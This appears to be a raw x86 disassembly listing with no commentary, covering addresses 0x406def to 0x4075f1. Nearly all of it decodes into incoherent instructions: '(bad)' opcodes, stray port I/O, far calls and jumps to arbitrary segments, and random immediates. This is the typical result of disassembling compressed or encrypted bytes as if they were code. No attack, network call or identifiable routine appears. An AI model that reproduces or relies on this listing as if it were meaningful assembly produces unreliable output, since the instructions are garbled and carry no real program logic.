  406def:	mov    ah,BYTE PTR [ebx+0x7c63df96]
  406df5:	add    BYTE PTR [eax+0x7cf55310],0xff
  406dfc:	dec    edi
  406dfd:	jl     0x406dec
  406dff:	dec    eax
  406e00:	xchg   esi,eax
  406e01:	pusha  
  406e02:	adc    esi,eax
  406e04:	push   ecx
  406e05:	frstor [ebx+ebp*2-0x5b]
  406e09:	es mov ch,0xf6
  406e0c:	test   al,0x38
  406e0e:	sbb    bh,ah
  406e10:	out    0x3a,eax
  406e12:	fst    DWORD PTR [eax]
  406e14:	adc    dh,cl
  406e16:	xchg   edx,eax
  406e17:	mov    al,BYTE PTR [ebx]
  406e19:	daa    
  406e1a:	leave  
  406e1b:	(bad)  
  406e1c:	gs call 0x2061:0x1d7bc6cb
  406e24:	mov    DWORD PTR [ebp+0x27],edx
  406e27:	push   0x6d891956
  406e2c:	xor    dl,BYTE PTR [esi]
  406e2e:	xchg   DWORD PTR [eax-0x47],esp
  406e31:	inc    ecx
  406e32:	xor    ah,BYTE PTR [edx-0x6]
  406e35:	clc    
  406e36:	scas   eax,DWORD PTR es:[edi]
  406e37:	imul   ecx,DWORD PTR [ebx+eiz*2],0x10
  406e3b:	pop    eax
  406e3c:	cmc    
  406e3d:	ja     0x406e0c
  406e3f:	enter  0x42b6,0xc1
  406e43:	mov    ebx,0x85bd3007
  406e48:	jp     0x406e01
  406e4a:	mov    al,0x67
  406e4c:	jg     0x406e4f
  406e4e:	jne    0x406e04
  406e50:	imul   ebp,DWORD PTR ds:0x293d67b8,0xdfe48da2
  406e5a:	push   ebx
  406e5b:	pop    ds
  406e5c:	es cld 
  406e5e:	mov    DWORD PTR [ebx-0x6182879c],esi
  406e64:	cmp    edx,eax
  406e66:	aad    0xd2
  406e68:	xor    esi,DWORD PTR [edi-0x16]
  406e6b:	adc    al,0x82
  406e6d:	and    al,0xbd
  406e6f:	cdq    
  406e70:	and    al,0x96
  406e72:	mov    dl,0xb7
  406e74:	das    
  406e75:	es lock enter 0x54e7,0xd0
  406e7b:	and    BYTE PTR [ebp-0x75d05124],cl
  406e81:	stc    
  406e82:	xchg   esp,eax
  406e83:	pop    ebp
  406e84:	ins    DWORD PTR es:[edi],dx
  406e85:	stc    
  406e86:	and    bh,BYTE PTR [ecx+edx*8+0x4c]
  406e8a:	inc    edi
  406e8b:	jp     0x406e27
  406e8d:	pop    esp
  406e8e:	pushf  
  406e8f:	test   DWORD PTR [ecx],0xaf03e7fe
  406e95:	push   cs
  406e96:	fldcw  WORD PTR [eax+0x33]
  406e99:	mov    ds:0x792f5b10,eax
  406e9e:	cmp    al,0xf1
  406ea0:	adc    al,0xc9
  406ea2:	fwait
  406ea3:	mov    ch,0x3a
  406ea5:	mov    ds:0x113dd1e8,eax
  406eaa:	imul   ecx,ecx,0xfffffff5
  406ead:	sub    ch,ch
  406eaf:	fsubr  QWORD PTR [edi-0x61]
  406eb2:	inc    ecx
  406eb3:	fcom   QWORD PTR [edx+0x1f5bc714]
  406eb9:	retf   
  406eba:	sbb    DWORD PTR [esi],eax
  406ebc:	shl    BYTE PTR [eax-0x3e331d55],cl
  406ec2:	cwde   
  406ec3:	jl     0x406e7c
  406ec5:	xchg   ecx,eax
  406ec6:	xor    DWORD PTR [esi-0x3e],edx
  406ec9:	(bad)  
  406eca:	mov    BYTE PTR [eax-0x12],cl
  406ecd:	mov    edx,ecx
  406ecf:	pop    eax
  406ed0:	mov    bh,0x74
  406ed2:	xchg   ebp,eax
  406ed3:	mov    al,ds:0xf3b61f69
  406ed8:	add    eax,0xc526cacf
  406edd:	icebp  
  406ede:	sbb    al,0x12
  406ee0:	outs   dx,DWORD PTR ds:[esi]
  406ee1:	cmp    cl,al
  406ee3:	and    esp,DWORD PTR [ecx]
  406ee5:	ins    BYTE PTR es:[edi],dx
  406ee6:	fnstcw WORD PTR [esi-0x3c200424]
  406eec:	test   al,0xe9
  406eee:	(bad)  
  406eef:	jg     0x406ed7
  406ef1:	inc    edx
  406ef2:	sbb    al,0xd4
  406ef4:	push   ebx
  406ef5:	cwde   
  406ef6:	(bad)  
  406ef7:	xor    dh,ah
  406ef9:	mov    ah,0x61
  406efb:	mov    al,ds:0xf763c4a6
  406f00:	mov    ebx,0x1ef28892
  406f05:	jae    0x406f73
  406f07:	fdivr  QWORD PTR [edx+edx*4+0x3b]
  406f0b:	cli    
  406f0c:	fcomp  DWORD PTR [eax+0x7f0bd3a7]
  406f12:	leave  
  406f13:	adc    ah,ch
  406f15:	jg     0x406edc
  406f17:	test   bh,bh
  406f19:	sub    al,0xcb
  406f1b:	inc    edi
  406f1c:	or     eax,DWORD PTR [esi+0x77]
  406f1f:	adc    ecx,DWORD PTR [edx+edi*2+0x211772ce]
  406f26:	xchg   bh,ah
  406f28:	mov    ch,0x67
  406f2a:	arpl   WORD PTR [esi-0x6cd44b02],bx
  406f30:	jecxz  0x406ec4
  406f32:	das    
  406f33:	cs arpl si,bp
  406f36:	lods   eax,DWORD PTR ds:[esi]
  406f37:	das    
  406f38:	jecxz  0x406ef0
  406f3a:	sbb    bl,BYTE PTR [ebp-0x80]
  406f3d:	cdq    
  406f3e:	retf   0xc333
  406f41:	push   ebx
  406f42:	cmp    bh,0x13
  406f45:	or     al,BYTE PTR [eax-0x4d10779a]
  406f4b:	cmp    al,0x14
  406f4d:	aam    0x45
  406f4f:	test   al,0xf9
  406f51:	push   ds
  406f52:	jle    0x406fba
  406f54:	int    0x99
  406f56:	xor    BYTE PTR [edi+0x38989000],bh
  406f5c:	call   0x2441:0x5775213d
  406f63:	das    
  406f64:	adc    eax,0xe3d0b82a
  406f69:	popa   
  406f6a:	into   
  406f6b:	fnsave [ecx]
  406f6d:	xor    dl,al
  406f6f:	jmp    0xf715:0xf86e4cc0
  406f76:	push   0x2aead609
  406f7b:	jl     0x406fda
  406f7d:	mov    esp,0x63678a5
  406f82:	mov    ch,0xc7
  406f84:	lods   eax,DWORD PTR ds:[esi]
  406f85:	xchg   ecx,eax
  406f86:	push   cs
  406f87:	cmp    BYTE PTR [esi],al
  406f89:	push   0x3cb6f63e
  406f8e:	fisubr DWORD PTR [edx]
  406f90:	jnp    0x406f59
  406f92:	arpl   WORD PTR [edx],sp
  406f94:	je     0x406f47
  406f96:	jle    0x406fd3
  406f98:	loope  0x406f7c
  406f9a:	and    ah,cl
  406f9c:	cdq    
  406f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f9e:	xor    DWORD PTR [eax+0x40b9719c],ecx
  406fa4:	push   cs
  406fa5:	loopne 0x406fb6
  406fa7:	jbe    0x406f85
  406fa9:	sbb    DWORD PTR [ebp+0x64],ebp
  406fac:	mov    ds:0xedec81da,eax
  406fb1:	jns    0x406f9b
  406fb3:	cmp    edi,edx
  406fb5:	jge    0x406f46
  406fb7:	mov    bh,0xb
  406fb9:	mov    BYTE PTR ds:0x104b3b43,ah
  406fbf:	jmp    0x3c0273cb
  406fc4:	lahf   
  406fc5:	lea    esi,[eax]
  406fc7:	es ret 
  406fc9:	mov    fs,edx
  406fcb:	inc    ebp
  406fcc:	daa    
  406fcd:	(bad)  
  406fcf:	xchg   ebp,eax
  406fd0:	cli    
  406fd1:	mov    ch,0x63
  406fd3:	add    ah,BYTE PTR ds:0x4e7ad0b3
  406fd9:	push   cs
  406fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fdb:	cmp    eax,0x9ea00d01
  406fe0:	mov    ebp,0x5be33723
  406fe5:	repz or DWORD PTR [edi+edx*4],edi
  406fe9:	mov    ecx,0xdb186547
  406fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fef:	push   0xe
  406ff1:	nop
  406ff2:	cmp    BYTE PTR [ebp+0x58],0x9c
  406ff6:	inc    edx
  406ff7:	dec    ebx
  406ff8:	aad    0xe7
  406ffa:	fild   DWORD PTR [ebx-0x18]
  406ffd:	cmp    eax,0x7268cc0f
  407002:	cs pop esp
  407004:	imul   ecx,DWORD PTR [ecx+0x3d],0xd1585410
  40700b:	cmp    BYTE PTR [ebp-0x59],cl
  40700e:	and    ebx,DWORD PTR [ebp-0x66]
  407011:	test   DWORD PTR [ebp-0x3cb4b2b9],esi
  407017:	lods   eax,DWORD PTR ds:[esi]
  407018:	push   ds
  407019:	leave  
  40701a:	daa    
  40701b:	dec    ebp
  40701c:	clc    
  40701d:	xlat   BYTE PTR ds:[ebx]
  40701e:	xor    BYTE PTR [ebx],0xf2
  407021:	lds    ebp,FWORD PTR [edx+0x79]
  407024:	rcl    BYTE PTR [ebp-0x73],1
  407027:	mov    cl,0x73
  407029:	xchg   edi,eax
  40702a:	xchg   ebx,eax
  40702b:	test   dh,bl
  40702d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40702e:	bnd jns 0x4070a1
  407031:	bnd jae 0x407086
  407034:	aaa    
  407035:	call   0x1ec3c39d
  40703a:	out    0xf0,al
  40703c:	cwde   
  40703d:	imul   edi,DWORD PTR [eax-0x11],0x25
  407041:	cld    
  407042:	loopne 0x406ff5
  407044:	inc    eax
  407045:	imul   ebx,DWORD PTR [esi+0x432c7759],0xdc43f769
  40704f:	idiv   eax
  407051:	retf   0x5757
  407054:	repz xor al,0x7e
  407057:	dec    ebx
  407058:	jge    0x40701c
  40705a:	mov    cl,0x62
  40705c:	adc    DWORD PTR [ebp-0x1930094e],edi
  407062:	sbb    al,0x9
  407064:	or     bl,BYTE PTR ds:0xea3232ef
  40706a:	and    DWORD PTR [ecx],ebx
  40706c:	addr16 loopne 0x407033
  40706f:	setp   BYTE PTR [edx]
  407072:	cmp    cl,BYTE PTR [ecx+0x7da36e98]
  407078:	popa   
  407079:	add    BYTE PTR [eax],al
  40707b:	cs push edx
  40707d:	bound  esi,QWORD PTR [edx+0x30]
  407080:	cmp    al,bl
  407082:	(bad)  
  407083:	aam    0x6
  407085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407086:	ins    BYTE PTR es:[edi],dx
  407087:	mov    bh,0x36
  407089:	jnp    0x4070c8
  40708b:	mov    cl,0xe1
  40708d:	in     al,dx
  40708e:	mov    ecx,0x3e216262
  407093:	nop
  407094:	inc    BYTE PTR [ebx+0xd888ccd]
  40709a:	test   al,0x84
  40709c:	fidiv  DWORD PTR [ecx]
  40709e:	push   esi
  40709f:	nop
  4070a0:	lock lods al,BYTE PTR ds:[esi]
  4070a2:	fcomp  DWORD PTR [eax+0x9]
  4070a5:	retf   
  4070a6:	pushf  
  4070a7:	pop    edx
  4070a8:	shl    DWORD PTR [edx-0x51],cl
  4070ab:	mov    ch,0xbe
  4070ad:	and    bl,dl
  4070af:	cmp    edi,DWORD PTR [esi+eiz*4-0x3cb6cef6]
  4070b6:	retf   
  4070b7:	or     eax,0x5a71cf27
  4070bc:	xchg   esp,eax
  4070bd:	adc    esp,eax
  4070bf:	neg    BYTE PTR [ecx]
  4070c1:	(bad)  
  4070c2:	push   esp
  4070c3:	aad    0xd1
  4070c5:	mov    eax,0xd911672b
  4070ca:	out    dx,al
  4070cb:	inc    esp
  4070cc:	adc    DWORD PTR ds:0xa686ea38,0xffffffa4
  4070d3:	addr16 jg 0x407155
  4070d6:	mov    ds:0x266601a5,eax
  4070db:	jg     0x407130
  4070dd:	cs je  0x407158
  4070e0:	mov    bh,0xd2
  4070e2:	mov    bh,0x73
  4070e4:	ficom  WORD PTR [ebx+0x1d]
  4070e7:	or     bl,BYTE PTR [ecx]
  4070e9:	rcl    dl,1
  4070eb:	shr    ecx,0x65
  4070ee:	in     eax,dx
  4070ef:	jg     0x407139
  4070f1:	or     bl,bl
  4070f3:	fidivr WORD PTR [ecx-0x2e896912]
  4070f9:	hlt    
  4070fa:	cld    
  4070fb:	add    ecx,edi
  4070fd:	mov    WORD PTR [ebp+0x2a],cs
  407100:	mov    edi,0xd9766fd9
  407105:	imul   edx,esp,0x3701256c
  40710b:	pop    ebx
  40710c:	aas    
  40710d:	ins    DWORD PTR es:[edi],dx
  40710e:	ins    DWORD PTR es:[edi],dx
  40710f:	mov    fs,WORD PTR [ebp-0x6c47edb9]
  407115:	sar    BYTE PTR [edi+ecx*1],cl
  407118:	or     eax,0xd742941e
  40711d:	rol    ebp,cl
  40711f:	mov    esp,0xd992331e
  407124:	jg     0x40716e
  407126:	addr16 cmp edx,ecx
  407129:	pusha  
  40712a:	imul   eax,DWORD PTR [eax],0x13
  40712d:	push   ds
  40712e:	fwait
  40712f:	push   ebx
  407130:	mov    ch,0xc2
  407132:	fwait
  407133:	cwde   
  407134:	sti    
  407135:	mov    DWORD PTR [edx],0x75627d8e
  40713b:	clc    
  40713c:	clc    
  40713d:	loop   0x407167
  40713f:	mov    bl,0x7a
  407141:	lds    edx,FWORD PTR [eax+0x53b18623]
  407147:	adc    al,0x34
  407149:	outs   dx,BYTE PTR ds:[esi]
  40714a:	mov    edx,0x74511598
  40714f:	cwde   
  407150:	ret    
  407151:	(bad)  
  407153:	jno    0x407181
  407155:	imul   ebx,ebx,0x1f
  407158:	inc    edx
  407159:	cwde   
  40715a:	fmul   QWORD PTR [ebx-0x59]
  40715d:	stos   DWORD PTR es:[edi],eax
  40715e:	pop    ss
  40715f:	sub    eax,0x3e1f55ad
  407164:	and    al,0x53
  407166:	inc    esp
  407167:	mov    esi,0x8a8d0d09
  40716c:	inc    edi
  40716d:	sub    al,0xed
  40716f:	xchg   esi,eax
  407170:	ficomp WORD PTR [eax]
  407172:	or     al,BYTE PTR [ebx-0xa0ed266]
  407178:	jb     0x4071e9
  40717a:	push   ebp
  40717b:	std    
  40717c:	pop    esi
  40717d:	(bad)  
  40717f:	or     cl,BYTE PTR [ebx-0x4]
  407182:	pushf  
  407183:	mov    esi,0xc9f38d76
  407188:	jmp    0x4071cc
  40718a:	add    ah,ah
  40718c:	jp     0x40715e
  40718e:	fld    DWORD PTR [edi+ecx*1+0x27144f34]
  407195:	fisubr WORD PTR [edx+ebx*4-0x33]
  407199:	jbe    0x40714d
  40719b:	shl    DWORD PTR [ecx],0xfc
  40719e:	enter  0x3566,0x65
  4071a2:	or     ebp,DWORD PTR ds:0x2855c60f
  4071a8:	mov    ebp,0x21cdadfd
  4071ad:	or     dl,dl
  4071af:	jp     0x407188
  4071b1:	xchg   edx,eax
  4071b2:	pusha  
  4071b3:	in     al,0xc
  4071b5:	push   edx
  4071b6:	add    dl,BYTE PTR [esi-0x43]
  4071b9:	int3   
  4071ba:	test   eax,0xfdd4d06a
  4071bf:	jo     0x40723d
  4071c1:	test   BYTE PTR [ebx],al
  4071c3:	push   cs
  4071c4:	sbb    ebx,esi
  4071c6:	leave  
  4071c7:	scas   eax,DWORD PTR es:[edi]
  4071c8:	mov    ah,0x81
  4071ca:	push   edx
  4071cb:	mov    esp,0xea84c7e7
  4071d1:	popa   
  4071d2:	int    0x95
  4071d4:	xor    dl,BYTE PTR [esi-0x5ecac7c9]
  4071da:	sub    BYTE PTR [esi-0x2d7d30d0],cl
  4071e0:	or     DWORD PTR [eax],eax
  4071e2:	or     eax,DWORD PTR [eax+0x25]
  4071e5:	(bad)  
  4071e6:	mov    ebp,0x5b71a19c
  4071eb:	add    ebx,DWORD PTR [eax+eiz*2+0x59]
  4071ef:	inc    esp
  4071f0:	daa    
  4071f1:	mov    ecx,0xa85820b
  4071f6:	sbb    eax,0x22880305
  4071fb:	dec    edx
  4071fc:	push   0x9872b0c3
  407201:	cmp    cl,BYTE PTR [eax+0x160def92]
  407207:	sub    eax,0x4062a7bd
  40720c:	and    DWORD PTR [ecx+0x5c],edx
  40720f:	mov    ch,0xa7
  407211:	mov    al,ds:0x852cef27
  407216:	adc    ch,BYTE PTR [edx]
  407218:	(bad)  
  407219:	adc    dl,ah
  40721b:	(bad)  
  40721c:	and    al,0x9
  40721e:	or     eax,0x8a31e85d
  407223:	xchg   edx,eax
  407224:	and    BYTE PTR [eax-0x5c11d159],ch
  40722a:	cmp    eax,0xe574c671
  40722f:	sub    bh,BYTE PTR [ebx+0x517173a4]
  407235:	sti    
  407236:	cmp    BYTE PTR [esp+ebp*1-0x2112575f],cl
  40723d:	mov    edi,0xaa86f774
  407243:	add    dh,BYTE PTR [ebx+ebx*1+0x44472922]
  40724a:	mov    ebx,0x26dadca1
  40724f:	cli    
  407250:	imul   edi,esi,0xbfa4673a
  407256:	ins    DWORD PTR es:[edi],dx
  407257:	cmp    al,0x8c
  407259:	pop    esi
  40725a:	pop    eax
  40725b:	loopne 0x4072c5
  40725d:	fcomp  DWORD PTR [esi-0x8]
  407260:	xor    eax,0x9f1a7c90
  407265:	mov    al,ds:0xb8d6c0d0
  40726a:	sbb    BYTE PTR [edx],dl
  40726c:	pusha  
  40726d:	sbb    ecx,DWORD PTR [ecx]
  40726f:	adc    cl,BYTE PTR [esi+edx*2+0x3986811f]
  407276:	cdq    
  407277:	jecxz  0x4072c0
  407279:	cmp    eax,0x28e76c3e
  40727e:	hlt    
  40727f:	add    al,0x4
  407281:	(bad)  
  407282:	sti    
  407283:	leave  
  407284:	out    dx,al
  407285:	or     eax,0x5643a02a
  40728a:	mov    esi,0x5954b6
  40728f:	pop    edx
  407290:	jns    0x4072cd
  407292:	repz shl DWORD PTR [ebx+0x4301b1b7],cl
  407299:	mov    ?,WORD PTR [ebp+0x15]
  40729c:	shr    DWORD PTR [eax],0xab
  40729f:	mov    ds:0xbfe83854,al
  4072a4:	cmp    BYTE PTR [edx],dh
  4072a6:	inc    edx
  4072a7:	xchg   ebp,eax
  4072a8:	(bad)  
  4072a9:	jbe    0x4072f7
  4072ab:	inc    esp
  4072ac:	adc    eax,0x5116fcc4
  4072b1:	int3   
  4072b2:	mov    bl,0x39
  4072b4:	adc    DWORD PTR [ebp+esi*2-0x56],edx
  4072b8:	or     bl,BYTE PTR [edi+0x24b7079b]
  4072be:	ret    0x1bce
  4072c1:	aas    
  4072c2:	in     al,0x87
  4072c4:	dec    esi
  4072c5:	pop    ebx
  4072c6:	aam    0x55
  4072c8:	aaa    
  4072c9:	sub    dh,cl
  4072cb:	es dec ebp
  4072cd:	jecxz  0x407321
  4072cf:	sub    BYTE PTR [esi+0x5f],bh
  4072d2:	adc    dh,al
  4072d4:	sti    
  4072d5:	test   BYTE PTR [edi+0x4509e5b6],ch
  4072db:	cdq    
  4072dc:	jbe    0x407314
  4072de:	adc    eax,0xb9dee031
  4072e3:	or     BYTE PTR [ecx-0x1743351],dh
  4072e9:	loopne 0x407297
  4072eb:	or     al,0x15
  4072ed:	mov    al,ds:0x1c5faeec
  4072f2:	pop    edx
  4072f3:	call   0xcc7f:0x5c768fd
  4072fa:	jmp    0xf7b23a66
  4072ff:	dec    ebp
  407300:	fcom   DWORD PTR [edi+0xf]
  407303:	push   edi
  407304:	xchg   ecx,eax
  407305:	and    al,0x5c
  407307:	imul   ebp,DWORD PTR [esi-0x5f],0x3e
  40730b:	fs sub edi,edi
  40730e:	jg     0x40737e
  407310:	out    dx,al
  407311:	add    esi,DWORD PTR [eax-0x26]
  407314:	retf   
  407315:	inc    ebx
  407316:	enter  0x8a05,0xb5
  40731a:	in     eax,dx
  40731b:	gs mov al,0x95
  40731e:	and    edx,esi
  407320:	xlat   BYTE PTR ds:[ebx]
  407321:	sub    al,0xb5
  407323:	mov    edx,0x9d4b37c5
  407328:	or     BYTE PTR [ebx],al
  40732a:	sbb    BYTE PTR [ecx+0x23],al
  40732d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40732e:	jmp    0x4072bd
  407330:	lds    ecx,FWORD PTR [edx+0x6675fb85]
  407336:	cli    
  407337:	scas   al,BYTE PTR es:[edi]
  407338:	mov    edi,0xa41c6718
  40733d:	xchg   ebp,eax
  40733e:	clc    
  40733f:	ins    BYTE PTR es:[edi],dx
  407340:	inc    edx
  407341:	push   eax
  407342:	cld    
  407343:	sub    al,0xb2
  407345:	dec    ecx
  407346:	push   edx
  407347:	mov    edi,0x4efc652e
  40734c:	jecxz  0x407398
  40734e:	push   es
  40734f:	daa    
  407350:	dec    esi
  407351:	jbe    0x40734c
  407353:	repz call 0x43d3:0x35f32757
  40735b:	sbb    bh,cl
  40735d:	adc    dh,BYTE PTR [ecx+esi*8+0x31]
  407361:	push   es
  407362:	out    dx,eax
  407363:	cmp    al,cl
  407365:	jmp    0x407395
  407367:	mulps  xmm3,xmm0
  40736a:	jae    0x40739e
  40736c:	sub    DWORD PTR [ebx+0x527f92a5],edi
  407372:	mov    esp,0x8d7d99e
  407377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407378:	inc    esi
  407379:	fst    QWORD PTR [edi]
  40737b:	sbb    ch,0xbc
  40737e:	cmp    eax,0xd2325c99
  407383:	sti    
  407384:	es daa 
  407386:	mov    edx,0xe8665dbf
  40738b:	stos   BYTE PTR es:[edi],al
  40738c:	call   0x86a6519a
  407391:	cmp    eax,0xd42b3688
  407396:	add    ch,ah
  407398:	pop    esp
  40739a:	xchg   ebx,ebx
  40739c:	sbb    al,cl
  40739e:	push   ecx
  40739f:	mov    ds:0x3c45b81b,eax
  4073a4:	aam    0x6d
  4073a6:	mov    ebp,0xd2623a58
  4073ab:	mov    ds:0xae605eeb,al
  4073b0:	es jp  0x40740a
  4073b3:	sbb    eax,0xe9648a7d
  4073b8:	sbb    eax,0x300a5cf6
  4073bd:	fimul  WORD PTR [ebx]
  4073bf:	ret    
  4073c0:	dec    esp
  4073c1:	sub    eax,0xb241bc24
  4073c6:	dec    esi
  4073c7:	popa   
  4073c8:	mov    ebx,es
  4073ca:	test   bl,bh
  4073cc:	xor    ah,BYTE PTR [ebp-0x7ebc4fdf]
  4073d2:	or     eax,0xa0ae0c0
  4073d7:	shr    BYTE PTR [ebp-0x17],0x72
  4073db:	inc    esi
  4073dc:	mov    ds:0x34b67007,al
  4073e1:	dec    ebp
  4073e2:	fcmovnbe st,st(2)
  4073e4:	sub    eax,0xd2090c80
  4073e9:	shl    DWORD PTR gs:[ebp+0x452f30f1],1
  4073f0:	loop   0x4073e0
  4073f2:	(bad)  
  4073f3:	jg     0x40743c
  4073f5:	mov    ds:0xa8f80c7e,al
  4073fa:	mov    ds:0x76572e0c,al
  4073ff:	icebp  
  407400:	cmp    ch,cl
  407402:	pop    ebx
  407403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407404:	inc    edi
  407405:	inc    ebx
  407406:	aas    
  407407:	add    dh,BYTE PTR [edx-0x2c]
  40740a:	sub    DWORD PTR [edx+0x27],edi
  40740d:	cmp    eax,ecx
  40740f:	pop    esi
  407410:	jg     0x407467
  407412:	pop    edi
  407413:	inc    esi
  407414:	sub    eax,0x4ee31b21
  407419:	mov    BYTE PTR [ecx],dl
  40741b:	mov    ds:0x2096b697,al
  407420:	popf   
  407421:	dec    esp
  407422:	jmp    0x407484
  407424:	or     DWORD PTR [esi+ebp*4-0x750ba45b],edi
  40742b:	aaa    
  40742c:	fidiv  DWORD PTR [eax]
  40742e:	fistp  DWORD PTR [ebx+edi*2-0x62]
  407432:	pop    ebp
  407433:	sbb    DWORD PTR [edi],eax
  407435:	scas   eax,DWORD PTR es:[edi]
  407436:	mov    eax,0x50921abb
  40743b:	imul   ebp,DWORD PTR [esi-0x3c],0xfffffffa
  40743f:	lock push cs
  407441:	xchg   ebx,eax
  407442:	cmp    DWORD PTR [ecx-0x73],ecx
  407445:	mov    eax,ds:0x8dd563
  40744a:	(bad)  
  40744b:	fs dec edi
  40744d:	jae    0x40749d
  40744f:	pop    ds
  407450:	int    0x7
  407452:	adc    BYTE PTR [edi],0x24
  407455:	xor    eax,0x5a03b376
  40745a:	adc    DWORD PTR [ebp-0x78dbe30e],ebp
  407460:	dec    ebp
  407461:	inc    ebp
  407462:	cmp    ch,dh
  407464:	into   
  407465:	int3   
  407466:	leave  
  407467:	mov    cl,0x4c
  407469:	cmc    
  40746a:	js     0x4074e7
  40746c:	bound  esp,QWORD PTR [ecx]
  40746e:	xchg   esi,eax
  40746f:	ja     0x407409
  407471:	dec    edx
  407472:	mov    cl,0x63
  407474:	loop   0x4074b1
  407476:	inc    edx
  407477:	mov    ds:0xf92a5ef9,eax
  40747c:	xchg   DWORD PTR [edx-0x37e1ca71],eax
  407482:	cmp    al,0x3d
  407484:	adc    al,0x3a
  407486:	push   esp
  407487:	sub    DWORD PTR [edx+ebp*2+0xe2c13bf],edx
  40748e:	sbb    DWORD PTR [eax+0xfc24407],edx
  407494:	pusha  
  407495:	sbb    DWORD PTR [esi+0x7],eax
  407498:	stc    
  407499:	mov    ebp,0xd23c7147
  40749e:	test   eax,0x380cbd10
  4074a3:	adc    esp,DWORD PTR [edi]
  4074a5:	retf   
  4074a6:	sbb    dl,bh
  4074a8:	ja     0x40743e
  4074aa:	call   0xdf0ced3
  4074af:	adc    ebp,ebp
  4074b1:	inc    edx
  4074b2:	jae    0x4074fc
  4074b4:	pop    ebp
  4074b5:	push   es
  4074b6:	ret    
  4074b7:	fld    TBYTE PTR [esi-0x3a]
  4074ba:	cdq    
  4074bb:	mov    cl,0x78
  4074bd:	dec    edi
  4074be:	adc    esi,esp
  4074c0:	test   al,0x39
  4074c2:	xor    BYTE PTR [edx],bh
  4074c4:	or     DWORD PTR [ebp-0x65661d3c],esi
  4074ca:	cld    
  4074cb:	iret   
  4074cc:	xchg   edi,eax
  4074cd:	std    
  4074ce:	sub    eax,0xe17ccc7d
  4074d3:	dec    edx
  4074d4:	jnp    0x407474
  4074d6:	ins    BYTE PTR es:[edi],dx
  4074d7:	aad    0x90
  4074d9:	test   al,0xda
  4074db:	mov    ebx,0x1e33ac5e
  4074e0:	(bad)  [ecx-0x66]
  4074e3:	jecxz  0x4074f4
  4074e5:	mov    ch,BYTE PTR [ebp-0x2ec44dec]
  4074eb:	pop    esp
  4074ec:	fs into 
  4074ee:	sahf   
  4074ef:	neg    DWORD PTR [ebx]
  4074f1:	push   ss
  4074f2:	and    eax,edx
  4074f4:	sub    esi,ebp
  4074f6:	in     al,0x97
  4074f8:	(bad)  
  4074f9:	cli    
  4074fa:	fwait
  4074fb:	mov    bl,0xdf
  4074fd:	cmp    eax,DWORD PTR [ebx]
  4074ff:	out    dx,al
  407500:	in     eax,dx
  407501:	rcr    al,1
  407503:	mov    BYTE PTR [edx],bl
  407505:	jg     0x40753e
  407507:	int3   
  407508:	retf   0x3501
  40750b:	lods   eax,DWORD PTR ds:[esi]
  40750c:	and    al,0x5d
  40750e:	mov    ebx,0xba8681c8
  407513:	or     BYTE PTR [edi],cl
  407515:	mov    bl,0xc3
  407517:	cs jae 0x4074af
  40751a:	(bad)  
  40751b:	outs   dx,DWORD PTR ds:[esi]
  40751c:	xchg   esi,esp
  40751e:	jmp    0x84b8:0x82159395
  407525:	and    esp,DWORD PTR ds:0xcbabf9de
  40752b:	inc    edi
  40752c:	push   edi
  40752d:	(bad)  
  40752e:	or     edx,0x46
  407531:	sub    BYTE PTR [edx-0x7e],0xf2
  407535:	ror    BYTE PTR [edi-0x4f],0x90
  407539:	mov    DWORD PTR [ecx+0x5f7b48ac],edx
  40753f:	in     al,dx
  407540:	mov    cl,0x9b
  407542:	sar    BYTE PTR [edi+ebp*1],0xad
  407546:	fdiv   QWORD PTR [esi-0x4e]
  407549:	jns    0x407584
  40754b:	in     al,dx
  40754c:	pop    es
  40754d:	adc    al,0x8f
  40754f:	retf   
  407550:	push   edi
  407551:	bound  esi,QWORD PTR [edx*2+0x579f0ef7]
  407558:	adc    eax,0x7fb84daa
  40755d:	pop    edx
  40755e:	pushf  
  40755f:	inc    ebx
  407560:	pop    edx
  407561:	mov    edx,0x32ef501f
  407566:	push   ebp
  407567:	cmp    eax,0x1a8730ce
  40756c:	push   ebp
  40756d:	sbb    esi,DWORD PTR [eax]
  40756f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407570:	(bad)  
  407571:	jle    0x407550
  407573:	(bad)  
  407574:	push   edi
  407575:	mov    esi,0xd7fadcb7
  40757a:	adc    eax,0x440bf2ef
  40757f:	mov    al,0x2
  407581:	or     dh,BYTE PTR [ecx]
  407583:	cdq    
  407584:	mov    ah,0x75
  407586:	pop    eax
  407587:	inc    edx
  407588:	mov    edi,0x811ebe5a
  40758d:	dec    ecx
  40758e:	push   ebp
  40758f:	sub    eax,0xe683c42f
  407594:	push   0x97aedf7a
  407599:	(bad)  
  40759a:	inc    esp
  40759b:	mov    eax,ds:0x6f657f6f
  4075a0:	ds cmp al,0xb5
  4075a3:	cmp    BYTE PTR [esi],al
  4075a5:	push   es
  4075a6:	push   ds
  4075a7:	cmp    al,0x5
  4075a9:	sahf   
  4075aa:	cmp    eax,0x4bf9ae0f
  4075af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075b0:	fisubr WORD PTR ds:0xfa087d00
  4075b6:	lds    ecx,FWORD PTR [esi]
  4075b8:	into   
  4075b9:	aad    0xb8
  4075bb:	sbb    al,0x72
  4075bd:	mov    ecx,0x3ee2b67f
  4075c2:	cld    
  4075c3:	pop    ds
  4075c4:	mov    eax,0x3abebac
  4075c9:	popa   
  4075ca:	jle    0x407561
  4075cc:	push   ecx
  4075cd:	xchg   esi,eax
  4075ce:	xchg   edx,eax
  4075cf:	or     al,0x66
  4075d1:	jns    0x40756d
  4075d3:	dec    ebp
  4075d4:	pop    esi
  4075d5:	and    al,0x62
  4075d7:	xor    ebx,DWORD PTR [esi+0x16236f54]
  4075dd:	pop    ds
  4075de:	into   
  4075df:	or     DWORD PTR [ecx+0x49],esp
  4075e2:	leave  
  4075e3:	mov    ds:0x5c49049c,al
  4075e8:	mov    bl,0x24
  4075ea:	int    0x47
  4075ec:	mov    al,ds:0x47fe3f19
  4075f1:	sub    BYTE PTR [ecx+0x75239f3a],ah
